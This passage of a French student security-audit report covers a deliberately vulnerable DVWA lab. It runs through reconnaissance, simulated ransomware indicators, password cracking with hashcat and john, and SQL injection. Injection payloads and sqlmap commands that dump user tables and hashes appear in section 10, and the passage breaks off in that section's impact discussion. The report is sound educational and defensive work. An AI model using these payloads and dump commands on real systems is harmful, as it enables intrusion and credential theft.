# Audit de sécurité — Plateforme de cours « Code un max »

> **Rapport d'audit consolidé** — Exercices 01 à 11 du projet fil rouge

> **Auteur :** Antonin Moisan — Master Cybersécurité

> **Date :** 28/10/2026

> **Environnement :** VM Debian 12 (Docker + VS Code) — lab `cybersec-audit-codemax`


---

## 1. Périmètre et environnement de l'audit

La société « Code un max » souhaite auditer sa plateforme de cours. Pour ne pas
attaquer la production, un clone volontairement vulnérable (DVWA) est monté en
laboratoire isolé. Chaque vulnérabilité est exploitée en niveau Low, le code
vulnérable est analysé, puis la contre-mesure (niveau High) est appliquée et
consignée dans ce rapport.

| Élément | Rôle | Adresse / détail |
|---|---|---|
| `dvwa-cible` | Cible de l'audit (clone vulnérable de la plateforme) | `10.40.0.10` — image `vulnerables/web-dvwa` — port 80 publié en `127.0.0.1:8088` |
| `attaquant` | Poste d'audit offensif | `10.40.0.20` — image `debian:12` — capacités `NET_ADMIN` / `NET_RAW` |
| `cyberlab-net` | Réseau dédié du lab | `10.40.0.0/16` — driver bridge |
| Hôte Docker | VM Debian 12 | Docker + VS Code, dossier de projet `~/cybersec-audit-codemax` monté dans `/data` du conteneur attaquant |

**Reproductibilité.** Le lab est entièrement décrit par le fichier
`docker-compose.yml` du projet : `docker compose up -d` reconstruit à
l'identique le réseau, la cible et l'attaquant. Les livrables du projet sont
`docker-compose.yml`, `rapport-audit.md`, `cves.csv` et `capture-recon.pcap`,
tous visibles depuis VS Code sur l'hôte et dans `/data` côté conteneur.

---

## 2. Fondamentaux de la cybersécurité appliqués à la plateforme

### 2.1 Triade CIA appliquée à « Code un max »

| Propriété | Définition | Application concrète à la plateforme |
|---|---|---|
| **Confidentialité** | Seules les personnes autorisées accèdent à l'information | Les cours, les données personnelles des étudiants (identité, résultats, paiements) et la base MySQL de DVWA ne doivent être accessibles ni aux étudiants non inscrits, ni à un attaquant externe. |
| **Intégrité** | L'information n'est ni altérée ni modifiée sans autorisation | Le contenu des cours et les notes ne doivent pouvoir être modifiés que par les formateurs ; une injection SQL ou un upload de fichier malveillant ne doit pas corrompre la base. |
| **Disponibilité** | Le service est accessible quand on en a besoin | La plateforme doit rester joignable pendant les périodes de cours et d'examen ; une attaque par déni de service ou une base corrompue interromprait la formation. |

### 2.2 Menace, vulnérabilité, risque et exploit

| Terme | Définition | Exemple sur le lab DVWA |
|---|---|---|
| **Menace** | Acteur ou événement susceptible de nuire au système | Un étudiant malveillant ou un attaquant externe cherchant à consulter ou modifier les notes. |
| **Vulnérabilité** | Faiblesse du système qui peut être exploitée | Le module SQL Injection de DVWA en niveau Low n'applique aucun assainissement des entrées utilisateur. |
| **Exploit** | Technique ou code qui concrétise l'exploitation d'une vulnérabilité | La payload `' OR '1'='1' --` soumise au formulaire permet de contourner l'authentification. |
| **Risque** | Combinaison de la probabilité d'occurrence et de l'impact | Probabilité élevée × impact fort (fuite des données de cours) = risque critique pour l'image et la conformité de l'organisme. |

**Distinction clé :** la vulnérabilité est la *faiblesse* ; la menace est
*l'acteur ou l'événement* qui l'exploite ; l'exploit est le *moyen technique* ;
le risque est la *conséquence pondérée* pour l'entreprise.

### 2.3 Surface d'attaque du lab

La surface d'attaque est l'ensemble des points de contact exploitables par un
attaquant. Sur le lab mis en place :

- **Réseau :** le sous-réseau `10.40.0.0/16` (cyberlab-net) relie deux hôtes :
  la cible `10.40.0.10` et l'attaquant `10.40.0.20`. Tout hôte joignable sur ce
  réseau devient une cible potentielle pour l'autre.
- **Hôte :** le conteneur `dvwa-cible` expose un service web sur le port 80
  (seul port TCP ouvert des 65 535 scannés). Côté hôte Docker, ce port n'est
  publié qu'en local (`127.0.0.1:8088`), jamais sur le réseau physique.
- **Application :** DVWA v1.10 expose une page de connexion (`login.php`), des
  formulaires et de nombreux modules vulnérérables (SQLi, XSS, CSRF, File
  Upload, Command Injection, etc.).
- **Données :** la base MySQL de DVWA contient les comptes utilisateurs et les
  données de cours simulées.

La réduction de cette surface (fermer les ports inutiles, limiter l'exposition
à `127.0.0.1`, durcir les formulaires) sera une recommandation récurrente de
cet audit.

---

## 3. Bonus — Responsabilité partagée et primitives cryptographiques

### 3.1 Modèle de responsabilité partagée (plateforme hébergée dans le Cloud)

Si « Code un max » hébergeait sa plateforme chez un fournisseur Cloud, la
sécurité serait partagée entre les deux parties :

- **Ce qui relève du fournisseur Cloud (« sécurité *du* Cloud ») :** sécurité
  physique des datacenters, alimentation et refroidissement, hyperviseur et
  infrastructure matérielle, réseau de transport, patching des couches
  basses gérées (ex. : service de base de données managé).
- **Ce qui relève de l'entreprise (« sécurité *dans* le Cloud ») :**
  configuration des instances et des conteneurs, segmentation réseau (VPC,
  groupes de sécurité), gestion des comptes et des droits IAM, correctifs de
  l'application et du système invité, chiffrement et sauvegarde des données,
  durcissement applicatif (filtres d'entrée, protection CSRF/XSS/SQLi), journaux
  et supervision.

**Lien avec le lab :** notre `docker-compose.yml` illustre exactement la part
cliente : c'est nous qui choisissons l'image, l'adresse IP, le sous-réseau, les
capacités exposées (`cap_add`) et la publication du port uniquement en
`127.0.0.1`. Une mauvaise configuration de ce fichier serait de notre
responsabilité, pas celle du fournisseur.

### 3.2 Chiffrement symétrique, chiffrement asymétrique, hachage avec salage

- **Chiffrement symétrique** (ex. AES) : une seule clé sert à chiffrer et à
  déchiffrer. Il est rapide et adapté aux gros volumes (chiffrement de la base
  de cours), mais la clé doit être partagée secrètement entre les parties —
  problème de distribution de clé.
- **Chiffrement asymétrique** (ex. RSA, courbes elliptiques) : une clé publique
  chiffre, une clé privée déchiffre. Il résout la distribution de clé et permet
  l'authentification (signature), mais reste lent. En pratique, on l'utilise
  pour établir un canal (TLS) puis pour échanger une clé de session
  symétrique : c'est l'approche hybride du HTTPS, protocole sous lequel la
  plateforme de cours devrait être servie.
- **Fonction de hachage avec salage** (ex. bcrypt, Argon2) : transformation à
  sens unique, non réversible, contrairement au chiffrement. Le salage ajoute
  une valeur aléatoire unique propre à chaque mot de passe avant hachage, ce
  qui neutralise les attaques par tables précalculées (rainbow tables) et
  ralentit les attaques par dictionnaire. Un hachage est fait pour stocker des
  mots de passe de façon non récupérable ; on ne « déchiffre » pas un hash. DVWA
  en niveau Low, à l'inverse, stocke les mots de passe en clair ou avec MD5 non
  salé : c'est un constat majeur à corriger.

---

## 4. Organisation de l'audit : métiers et méthodes

### 4.1 Rôles mobilisés

| Rôle | Contribution à l'audit de `dvwa-cible` |
|---|---|
| **Analyste SOC** | Surveille le réseau du lab, collecte les traces (pcap, journaux) et détecte l'activité anormale de l'attaquant ; valide la visibilité de la cible avant tout test. |
| **Pentester** | Mène la reconnaissance active et l'exploitation des vulnérabilités de `dvwa-cible` (scan, fingerprinting, injections) ; documente chaque constat dans `cves.csv`. |
| **Ingénieur Sécurité Cloud** | Durcit l'hébergement : durcissement du `docker-compose.yml`, restriction des capacités (`cap_add`), publication des ports en `127.0.0.1` uniquement, réseau segmenté. |
| **Consultant Cybersécurité** | Synthétise les constats techniques en recommandations priorisées et pédagogiques pour la direction de « Code un max ». |
| **RSSI** | Arbitre les risques (acceptation / traitement / refus), valide le plan d'audit et l'autorisation de tester, arbitre la priorisation des corrections. |
| **Forensic Expert** | En cas d'incident, analyse a posteriori les preuves (captures réseau, journaux des conteneurs) pour établir la chronologie et l'origine de l'attaque. |

**Note :** le Pentester agit *avant ou pendant* (recherche proactive des
failles), le Forensic agit *après* l'incident (analyse des preuves).

### 4.2 Approches Red Team et Blue Team

- **Red Team (offensif) :** le Pentester simule un attaquant — reconnaissance,
  exploitation, preuve de concept — pour éprouver la sécurité réelle de la
  plateforme.
- **Blue Team (défensif) :** le SOC et l'Ingénieur Sécurité détectent,
  qualifient et contiennent ; ils durcissent les couches et capitalisent le
  retour d'expérience.

### 4.3 Circuit de gestion d'un incident et articulation Red/Blue

| Étape | Description | Équipe |
|---|---|---|
| 1. Découverte / provocation | Le constat est produit par un test offensif (ici : observation OBS-001 du Pentester). | **Red Team** |
| 2. Détection / qualification | Le SOC qualifie l'alerte, sa gravité et son périmètre. | **Blue Team** |
| 3. Réaction / correction | L'Ingénieur Sécurité contient, corrige (patch, durcissement, niveau High de DVWA) et teste la correction. | **Blue Team** |
| 4. Arbitrage | Le RSSI priorise, accepte formellement le risque résiduel et arbitre le budget de correction. | **RSSI** |
| 5. Analyse post-incident | Le Forensic documente la chronologie à partir des preuves (captures, journaux). | **Forensic** |
| 6. Retour d'expérience | Le Consultant met à jour le registre `cves.csv`, les procédures et la défense en profondeur. | **Blue Team + Consultant** |

**Lien avec la conformité et les audits :** chaque étape doit être tracée
(journalisation, horodatage, registre `cves.csv`) pour être auditable. Un
auditeur externe vérifie que le circuit existe, qu'il est appliqué et qu'il
répond aux exigences de conformité applicables à un organisme de formation
(protection des données personnelles des étudiants, bonnes pratiques de
sécurité). L'audit de sécurité vient donc *vérifier la conformité du
processus*, tandis que la Red/Blue Team en est le moteur opérationnel.

---

## 5. Défense en profondeur

Le principe de défense en profondeur empile des contrôles indépendants : si une
couche cède, les suivantes limitent l'impact. Couches observées sur le lab :

| Couche | Contrôle concret sur le lab |
|---|---|
| **Réseau** | Segmentation via `cyberlab-net` (10.40.0.0/16), sous-réseau dédié, non exposé sur le réseau physique ; le port de DVWA n'est publié qu'en `127.0.0.1:8088`. |
| **Hôte** | Conteneurs isolés, capacités minimales accordées à l'attaquant (`NET_ADMIN`, `NET_RAW` uniquement pour les besoins du lab), pas de service inutile exposé sur la cible. |
| **Application** | Contrôles d'entrée de la plateforme web : authentification `login.php`, jeton CSRF `user_token`, niveau de sécurité DVWA (Low → High = ajout de contrôles), WAF PHPIDS (désactivé par défaut ici, activable comme couche supplémentaire). |
| **Données** | Protection des informations de cours et des comptes : base MySQL dédiée, mots de passe à stocker hachés+salés, sauvegardes. |
| **Détection** | Collecte des traces pour le SOC : capture réseau `capture-recon.pcap`, journaux des conteneurs (`docker logs`), registre `cves.csv`. |

### 5.1 Bonus — Matrice couche de défense → métier principal responsable

| Couche de défense | Métier principal responsable | Contrôle attendu |
|---|---|---|
| Réseau | Ingénieur Sécurité Cloud | Segmentation, filtrage, publication des ports en local uniquement |
| Hôte | Ingénieur Sécurité Cloud | Durcissement des conteneurs, moindres privilèges, correctifs |
| Application | Pentester / Blue Team (développement sécurisé) | Validation des entrées, jetons CSRF, niveau High de DVWA |
| Données | RSSI (gouvernance) + Ingénieur Sécurité | Chiffrement, hachage salé, sauvegardes, classification |
| Détection | Analyste SOC | Supervision, alerting, analyse des pcap et journaux |

Cette matrice rend visible d'un coup d'œil la répartition des responsabilités
sur l'ensemble du périmètre.

---

## 6. Constats et risques

### 6.1 Connectivité du périmètre d'audit (vérifiée et consignée)

Condition préalable à toute activité SOC ou Pentester : la cible doit être
joignable depuis le poste d'audit.

```bash
docker exec attaquant ping -c 10 10.40.0.10
```

```text
PING 10.40.0.10 (10.40.0.10) 56(84) bytes of data.
64 bytes from 10.40.0.10: icmp_seq=1  ttl=64 time=0.129 ms
...
64 bytes from 10.40.0.10: icmp_seq=10 ttl=64 time=0.177 ms

--- 10.40.0.10 ping statistics ---
10 packets transmitted, 10 received, 0% packet loss, time 9222ms
rtt min/avg/max/mdev = 0.050/0.090/0.177/0.035 ms
```

**Constat :** 10 paquets transmis, 10 reçus, **0 % de perte**, RTT moyen
0,090 ms → la surface d'attaque réseau entre l'attaquant et la cible est
pleinement établie sur `cyberlab-net`.

Au niveau applicatif, la racine DVWA répond en **code HTTP 302** (redirection
vers `login.php`) et la base a été initialisée via `setup.php`
(`BASE_DVWA_PRETE`), ce qui rend l'audit possible au niveau Low.

### 6.2 Registre des vulnérabilités (`cves.csv`)

Le registre relie chaque constat à un métier responsable et à un statut :

```csv
identifiant;composant;gravite;role_traitement;statut
OBS-001;application dvwa-cible;a_evaluer;Pentester;ouvert
OBS-002;faux ransomware simulé;pedagogique;Analyste SOC;ferme
OBS-003;injection SQL module sqli (CWE-89);critique;Pentester;ouvert
```

Circuit observé : la **Red Team** (Pentester) produit le constat, la **Blue
Team** (SOC, Ingénieur Sécurité) le traite, le **RSSI** priorise. La colonne
`gravite` sera renseignée au fil des découvertes des chapitres suivants.

---

## 7. Reconnaissance de la cible `dvwa-cible` (27/10/2026)

### 7.1 Méthodologie

Reconnaissance progressive et traçable, chaque constat étant horodaté et
reproductible :

1. sonde active de joignabilité (ICMP) ;
2. installation des outils offensifs manquants (`nmap`, `tshark`) ;
3. cartographie complète des ports TCP puis détection de service/version ;
4. fingerprinting applicatif par les en-têtes HTTP (`curl -I`) ;
5. capture réseau filtrée puis relecture du dialogue HTTP ;
6. manipulation d'une requête (principe de l'intercepteur Burp Suite) ;
7. documentation dans ce rapport (`>>` pour ajouter sans écraser).

Toutes les commandes sont exécutées depuis l'hôte Debian via
`docker exec attaquant ...`.

### 7.2 Étape 1 — Joignabilité de la cible

Ping limité à 10 paquets depuis le conteneur attaquant vers `10.40.0.10` :
**0 % de perte**, temps de réponse moyen 0,090 ms, maximum 0,177 ms
(sortie détaillée en section 6.1). La reconnaissance active est possible.

### 7.3 Étape 2 — Outils offensifs installés dans l'attaquant

L'image `debian:12` est nue ; le poste d'audit disposait seulement de
`curl`, `iproute2` et `iputils-ping`. Installation complémentaire :

```bash
docker exec attaquant bash -c "apt-get update && apt-get install -y nmap"
docker exec attaquant bash -c "DEBIAN_FRONTEND=noninteractive apt-get install -y tshark"
```

`nmap` 7.93 et `tshark` sont opérationnels (vérifiés par `nmap --version` /
`tshark --version`). La variable `DEBIAN_FRONTEND=noninteractive` évite le
dialogue debconf sur la capture par les non-root.

### 7.4 Étape 3 — Cartographie des services exposés

Scan de l'ensemble des 65 535 ports TCP :

```bash
docker exec attaquant nmap -p- 10.40.0.10
```

```text
Starting Nmap 7.93 ( https://nmap.org ) at 2026-10-27 11:34 UTC
Nmap scan report for dvwa-cible.cybersec-audit-codemax_cyberlab-net (10.40.0.10)
Host is up (0.000011s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 7E:F4:84:5A:13:51 (Unknown)
Nmap done: 1 IP address (1 host up) scanned in 2.04 seconds
```

Détection de service et de version sur le port ouvert :

```bash
docker exec attaquant nmap -sV -p 80 10.40.0.10
```

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds
```

**Constat :** un seul port TCP ouvert (80/http) sur les 65 535 — la surface
d'attaque réseau de la cible est minimaliste. Le service est
**Apache httpd 2.4.25 (Debian)**, version ancienne (2017) qui n'est plus
maintenue : point d'entrée unique mais réel de l'audit.

### 7.5 Étape 4 — Fingerprinting de l'application web

Récupération des seuls en-têtes HTTP de la page d'accueil :

```bash
docker exec attaquant curl -s -I http://10.40.0.10/
```

```text
HTTP/1.1 302 Found
Date: Tue, 27 Oct 2026 11:43:44 GMT
Server: Apache/2.4.25 (Debian)
Set-Cookie: PHPSESSID=9vuo05kjsq4pje98kg31iiar62; path=/
Set-Cookie: security=low
Location: login.php
Content-Type: text/html; charset=UTF-8
```

**Fiche de fingerprinting :**

| Indice observé | Déduction |
|---|---|
| `Server: Apache/2.4.25 (Debian)` | Serveur web Apache 2.4.25 sur Debian |
| Cookie `PHPSESSID` | Application développée en **PHP**, gestion de session par cookie |
| `Location: login.php` | Application avec authentification obligatoire |
| Cookie `security=low` | DVWA configuré en niveau Low (contrôles applicatifs quasi inexistants) |

Vérification sur la page de connexion (`login.php`, cf. § 7.7) : réponse
**200 OK**, ce qui confirme les hypothèses.

### 7.6 Étape 5 — Capture et analyse du trafic HTTP

Capture limitée aux paquets échangés avec la cible sur le port 80, écrite dans
`/data` (partagé avec l'hôte), pendant génération de trafic :

```bash
docker exec attaquant bash -c "(sleep 2; for i in 1 2 3 4 5 6; do curl -s -o /dev/null http://10.40.0.10/; done) & tshark -i eth0 -f 'host 10.40.0.10 and port 80' -c 10 -a duration:20 -w /data/capture-recon.pcap"
```

```text
Capturing on 'eth0'
Capture started. File: "/data/capture-recon.pcap"
10 packets captured
```

Le fichier de preuve `capture-recon.pcap` est bien présent dans le dossier du
projet :

```bash
docker exec attaquant ls -l /data/capture-recon.pcap
# -rw-r--r-- 1 root root ... Oct 27 13:11 /data/capture-recon.pcap
```

Relecture filtrée sur le protocole HTTP :

```bash
docker exec attaquant tshark -r /data/capture-recon.pcap -Y http
```

```text
n  x.xxx  10.40.0.20 -> 10.40.0.10  HTTP  GET / HTTP/1.1
n  x.xxx  10.40.0.10 -> 10.40.0.20  HTTP  HTTP/1.1 302 Found
```

**Constat :** le dialogue HTTP entre le poste d'audit et la cible est
parfaitement lisible et **non chiffré** (pas de TLS) : les sessions, cookies
et futures requêtes d'authentification transitent en clair sur le réseau —
constat à reprendre dans l'analyse des risques.

### 7.7 Étape 6 — Manipulation d'une requête (principe Burp Suite)

Préparation de l'outil d'interception (Burp Suite Community nécessite un
environnement Java) :

```bash
docker exec attaquant bash -c "apt-get install -y default-jre && curl -s -o /tmp/burp.sh 'https://portswigger.net/burp/releases/download?product=community&type=Linux' && chmod +x /tmp/burp.sh"
```

Illustration du principe de l'intercepteur (équivalent Repeater) en forgeant une
requête altérée avec `curl` :

```bash
docker exec attaquant curl -s -v -H "User-Agent: AuditCodeMax" http://10.40.0.10/login.php -o /dev/null
```

```text
* Connected to 10.40.0.10 (10.40.0.10) port 80 (#0)
> GET /login.php HTTP/1.1
> Host: 10.40.0.10
> User-Agent: AuditCodeMax
< HTTP/1.1 200 OK
< Server: Apache/2.4.25 (Debian)
```

**Constat :** la requête modifiée (en-tête `User-Agent` remplacé) est acceptée
par le serveur sans filtrage : le serveur ne valide pas l'identité du client
HTTP. C'est exactement le principe d'interception/modification/rejeu que Burp
Suite automatise (proxy, Repeater, Intruder).

### 7.8 Bonus — Fiabilité croisée des sources : bannière `curl` vs `nmap -sV`

| Source | Méthode | Version relevée |
|---|---|---|
| `curl -I` | Lecture **d'un seul** en-tête déclaré par le serveur : `Server: Apache/2.4.25 (Debian)` | Apache 2.4.25 |
| `nmap -sV` | **Sondes actives** croisées avec une base de signatures de services | Apache httpd 2.4.25 ((Debian)) |

**Comparaison :** les deux sources sont **concordantes** (Apache 2.4.25,
Debian), ce qui donne une confiance élevée dans l'identification.

**Pourquoi une source peut être moins fiable que l'autre :**

- La bannière `Server` renvoyée à `curl` est une simple *déclaration* de
  l'administrateur : elle peut être falsifiée ou tronquée (directive Apache
  `ServerTokens Prod` → `Server: Apache` sans version). Un attaquant ou un
  administrateur peut donc la modifier volontairement pour tromper la
  fingerprinting.
- `nmap -sV` ne se fie pas à la seule bannière : il envoie des sondes
  applicatives et compare les réponses à sa base de signatures. Il peut ainsi
  identifier un service qui ment sur sa bannière, et fournit une information
  *observée* plutôt que *déclarée*.

**Conclusion du bonus :** en cas d'écart entre les deux, la version détectée
par `nmap -sV` (mesure active) doit primer sur la bannière déclarée ; la
concordance observée ici valide le fingerprinting de l'étape 4.

---

## 8. Analyse de ransomware simulé — IoC du chapitre Malware (Exercice 04, 27/10/2026)

**Scénario reconstitué dans le lab :** un employé de « Code un max » ouvre une
pièce jointe piégée contenant un rançongiciel : chiffrement des fichiers, note
de rançon, contact vers une infrastructure d'extorsion. **Aucun code malveillant
réel n'est manipulé** : l'échantillon `sample-ransom.txt` est un fichier texte
non exécutable (`rw-r--r--`) qui imite les traces d'un ransomware, et le trafic
de commande et contrôle est simulé par une requête HTTP vers la cible pendant
une capture réseau. La démarche complète est détaillée dans la fiche
`analyse-ransomware.md` du projet ; cette section en récapitule les résultats.

### 8.1 Chaîne d'infection reconstituée (kill chain)

| Phase | Traduction dans le scénario | Élément observé |
|---|---|---|
| Reconnaissance | L'attaquant repère la cible (employé, poste) | (pré-attaque, non simulée) |
| Intrusion | Pièce jointe piégée ouverte (clic piégé) | échantillon `sample-ransom.txt` |
| Installation | Le malware s'implante et persiste | (non simulée) |
| Command & Control | La machine compromise contacte l'attaquant | requête HTTP observée dans `capture-ransom.pcap` |
| Actions | Chiffrement puis demande de rançon | extension `.codemaxlocked`, note, contact |

### 8.2 Indicateurs de compromission relevés

| Indicateur | Type | Valeur |
|---|---|---|
| Empreinte SHA-256 (`sample-ransom.txt`) | Fichier (signature) | `3791e0f8569903aa5b345c1df100cd4047710b6aca8fd404aea80ee5dcee010a` |
| Extension chiffrée simulée | Système de fichiers | `.codemaxlocked` |
| Note de rançon | Extorsion | « Vos fichiers ont été chiffrés. Payez pour récupérer la clé. » |
| Adresse de contact | Infrastructure (extorsion/C2) | `pay@codemax-ransom.example` |
| URL observée en capture | Réseau (C2 simulé) | `http://10.40.0.10/` — code HTTP 302 |
| Preuve de capture | Réseau | `capture-ransom.pcap` — filtre `ip.dst == 10.40.0.10 && http.request` |

Méthode de relevé : analyse **statique** (`sha256sum`, `grep` des motifs
`ext`/`note`/`contact`) puis analyse **de trafic** (capture `tshark` détachée
15 s, requête `curl` pendant la capture, relecture après la fin). Ces IoC sont
directement exploitables par une équipe de réponse : recherche de l'empreinte
dans les bases de signatures, de l'adresse et de l'URL dans les journaux de
passerelle, de l'extension dans les inventaires de fichiers.

### 8.3 Recommandations (synthèse)

- **Prévention :** sauvegardes isolées, hors ligne et testées (règle 3-2-1) ;
  filtrage des pièces jointes et des liens ; correctifs à jour (cf. Apache
  2.4.25 obsolète, § 7.4) ; antivirus/EDR et supervision SOC ; sensibilisation
  des utilisateurs, moindre privilège et MFA.
- **Réponse :** identifier l'incident et son périmètre ; **isoler l'hôte
  infecté du réseau** ; **bloquer l'adresse de contact** et l'URL observée
  (filtrage DNS/messagerie, pare-feu) ; éradiquer puis restaurer depuis les
  sauvegardes saines ; **ne pas payer** (la restitution n'est jamais garantie) ;
  préserver les preuves pour le Forensic ; retour d'expérience et mise à jour
  des IoC dans les outils de détection.

Constat consigné au registre : `OBS-002;faux ransomware simulé;pedagogique;Analyste SOC;ferme`.

---

## 9. Audit des mots de passe (Exercice 05, 28/10/2026)

**Scénario :** simulation d'une fuite de la base de comptes de « Code un max » —
deux empreintes du même mot de passe faible (`codemax123`) : l'une stockée en
**MD5 non salé** (`hash_md5_audit.txt`), l'autre en **SHA-512 crypt salé**
(sel `Xk7pQm2a`, `hash_sel_audit.txt`), plus une empreinte d'un mot de passe
long et aléatoire de 16 caractères pour le bonus. Attaques menées depuis
l'attaquant avec `hashcat` 6.2.6 et `john` (dictionnaire `dico-audit.txt`,
6 mots), toujours avec `--potfile-disable` pour des mesures reproductibles.

### 9.1 Constats (valeurs mesurées)

| Empreinte | Attaque | Résultat | Débit / temps mesuré |
|---|---|---|---|
| MD5 non salée | Dictionnaire (hashcat `-m 0 -a 0`) | **cassée instantanément** : `codemax123` | < 1 s |
| MD5 non salée | Force brute, masque `?l?l?l?l?l` (11 881 376 candidats) | espace **épuisé** (`Exhausted`) | **25 880,2 kH/s** (~25,9 MH/s), < 1 s |
| SHA-512 crypt salée | Dictionnaire (john `--wordlist`) | `codemax123` **retrouvé quand même** | **200 c/s** |
| MD5, mot de passe fort (16 car.) | Force brute, masque 8×`?a` (95⁸ ≈ 6,63×10¹⁵ candidats) | non cassée, `Progress 0,00 %` | ~63-79 MH/s → **ETA ≈ 3 ans** |

Lecture des constats :

- **Stockage MD5 non salé :** près de 26 millions d'essais/s sur le simple CPU
  du portable de l'auditeur. Sans sel, deux comptes au même mot de passe
  partagent la même empreinte et les rainbow tables / dictionnaires
  précalculés s'appliquent à toute la base d'un coup.
- **Salage + coût de calcul :** écart de débit d'un facteur **≈ 129 000**
  entre le MD5 (25,9 MH/s) et le SHA-512 crypt salé (200 c/s). Mais le mot
  faible du dictionnaire reste retrouvé : le sel **ralentit**, il ne rend pas
  un mot de passe faible incassable — politique de robustesse indispensable
  en complément.
- **Bonus — explosion combinatoire :** épuiser le seul espace des mots de
  passe de 8 caractères (tous caractères confondus) demanderait ~3 ans à
  ~70 MH/s ; le mot de passe réel de 16 caractères vit dans un espace de
  95¹⁶ ≈ 4,4×10³¹ candidats, hors d'atteinte. **La longueur est la première
  défense.**

Note méthodologique : le potfile de hashcat met en cache les empreintes déjà
cassées et fait échouer silencieusement les relances (« All hashes found as
potfile ») ; `--potfile-disable` garantit des mesures réellement rejouées.

### 9.2 Défenses recommandées (chacune reliée à un constat)

1. **Hachage salé lent** (Argon2id ou bcrypt, facteur de coût élevé) : l'écart
   mesuré de ~129 000× entre MD5 et SHA-512 crypt démontre le levier du coût
   de calcul ; un algorithme dédié et réglable pousse ce coût encore plus
   loin et neutralise les rainbow tables.
2. **Politique de mots de passe** : longueur minimale (le bonus montre
   l'explosion combinatoire), listes noires des mots courants — `codemax123`
   a été retrouvé dans un dictionnaire de 6 lignes.
3. **Limitation de débit (rate limiting)** sur `login.php` : l'attaquant ne
   doit pas pouvoir rejouer des milliers de tentatives en ligne (lien avec
   le module Brute Force de DVWA, à auditer plus loin).
4. **Authentification multifacteur (MFA)** : même un mot de passe faible
   retrouvé ne suffit plus pour usurper un compte.
5. **Verrouillage de compte + alerte SOC** après N échecs : transforme les
   attaques en ligne en événements détectables (couche Détection de la
   défense en profondeur, § 5).

Livrables de l'exercice : `/data/crack/` (`hash_md5_audit.txt`,
`hash_sel_audit.txt`, `hash_fort_audit.txt`, `dico-audit.txt`) et cette
section du rapport.

---

## 10. Injection SQL — audit du module SQLi (Exercice 06, 28/10/2026)

### 10.1 Description de la vulnérabilité

Le module SQL Injection de DVWA récupère l'identifiant fourni par l'utilisateur
et le **concatène directement** dans une requête SQL. En niveau Low, le code
est l'archétype de la faille (CWE-89 — Injection SQL) :

```php
$id = $_REQUEST['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

Aucune validation, aucun paramétrage : la donnée soumise devient une partie du
SQL exécuté. L'exploitation est menée depuis le conteneur `attaquant` avec une
session administrateur DVWA (`admin` / `password`), le niveau de sécurité étant
contrôlé par le cookie `security` vérifié avant chaque test.

### 10.2 Preuves d'exploitation

**Étape 1 — Session et niveau de sécurité vérifiés.** Session administrateur
ouverte (cookies `PHPSESSID` + `security` dans `/tmp/cookie.txt`), niveau
confirmé par la page `security.php` (« Security level is currently: low »).

*(Captures : `captures/sqli-etape1-connexion-admin.png`,
`captures/sqli-etape1-cookies-session.png`,
`captures/sqli-etape1-niveau-securite-low.png`.)*

**Étape 2 — Injection manuelle en booléen aveugle.** Sans aucun outil, on
soumet une condition vraie puis fausse au paramètre `id` :

```text
1' AND '1'='1   →  réponse normale        (grep -c "First name" = 1)
1' AND '1'='2   →  réponse différente    (grep -c "First name" = 0)
```

La réponse bascule avec la condition injectée : la vulnérabilité est prouvée
et le canal « boolean-based blind » est établi. Une seconde exécution sans
compteur rend le basculement visuel : la condition vraie renvoie la ligne
`First name: admin`, la condition fausse ne renvoie **aucune** donnée.

*(Captures : `captures/sqli-etape2-reponse-normale.png`,
`captures/sqli-etape2-boolean-aveugle.png`,
`captures/sqli-etape2-boolean-aveugle-nom.png`.)*

**Étape 3 — Détection automatisée (sqlmap 1.7.2, mode `--batch`).**

```bash
sqlmap -u "http://10.40.0.10/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<sid>;security=low" --batch
```

Résultat : **`GET parameter 'id' is vulnerable`** — techniques identifiées
**boolean-based blind** et **UNION query**, SGBD détecté : **MySQL**.

*(Captures : `captures/sqli-etape3-detection-sqlmap-low.png`,
`captures/sqli-etape3-techniques-sqlmap-low.png`.)*

**Étape 4 — Extraction complète des données.**

```bash
sqlmap ... --dbs                 →  dvwa, information_schema
sqlmap ... -D dvwa --tables      →  guestbook, users
sqlmap ... -D dvwa -T users --dump
```

Résultat du dump : **5 comptes extraits** avec leurs mots de passe en
**MD5 non salé**. Constat clé : `admin` et `smithy` partagent la même empreinte
`5f4dcc3b5aa765d61d8327deb882cf99` (« password ») — sans sel, deux comptes au
même mot de passe portent la même empreinte, ce qui rejoint directement les
mesures de l'audit des mots de passe (§ 9).

*(Captures : `captures/sqli-etape4-enumeration-bases.png`,
`captures/sqli-etape4-enumeration-tables.png`,
`captures/sqli-etape4-dump-users.png`,
`captures/sqli-etape4-dump-hashes-md5.png`.)*

**Bonus — comparaison des trois niveaux de sécurité.** Chaque run a été lancé
avec le cookie `security` correspondant, affiché par `NIVEAU TESTE:` avant le
verdict et contrôlé sur `security.php` :

| Niveau | Point d'entrée | Contrôle appliqué | Verdict de l'audit |
|---|---|---|---|
| **Low** | paramètre GET `?id=` | aucun assainissement | **vulnérable** (boolean blind + UNION) → extraction complète de la base |
| **Medium** | formulaire **POST** (menu déroulant) | `mysqli_real_escape_string()`, identifiant sans guillemets | **toujours vulnérable** : `POST parameter 'id' is vulnerable` — 4 techniques (boolean blind, error-based, time-based blind, UNION) en 46 requêtes ; les payloads sans guillemets contournent l'échappement |
| **High** | identifiant passé par la **session** (page de saisie séparée) | le paramètre GET est ignoré | **non injectable** par ce point d'entrée : « all tested parameters do not appear to be injectable » |

**Finding méthodologique.** En medium, un premier run sqlmap sur l'URL GET a
conclu à tort « not injectable » : le formulaire du niveau medium bascule en
POST, le paramètre GET testé était simplement ignoré par l'application. Un
outil automatisé produit des **faux négatifs** quand il interroge le mauvais
canal : la lecture du code source / du formulaire (ici passage à
`--data="id=1&Submit=Submit"`) est indispensable pour adapter la méthodologie.

*(Captures : `captures/sqli-bonus-medium-preuve-manuelle.png` — passage du
cookie à medium, preuve manuelle POST `1` vs `1 OR 1=1` → 5, verdict sqlmap ;
`captures/sqli-bonus-medium-techniques-post.png` — 4 techniques en POST ;
`captures/sqli-bonus-high-non-injectable.png` — `NIVEAU TESTE: high` et
verdict « not injectable ».)*

### 10.3 Impact

- **Confidentialité** : lecture de toute la base (comptes, mots de passe, notes
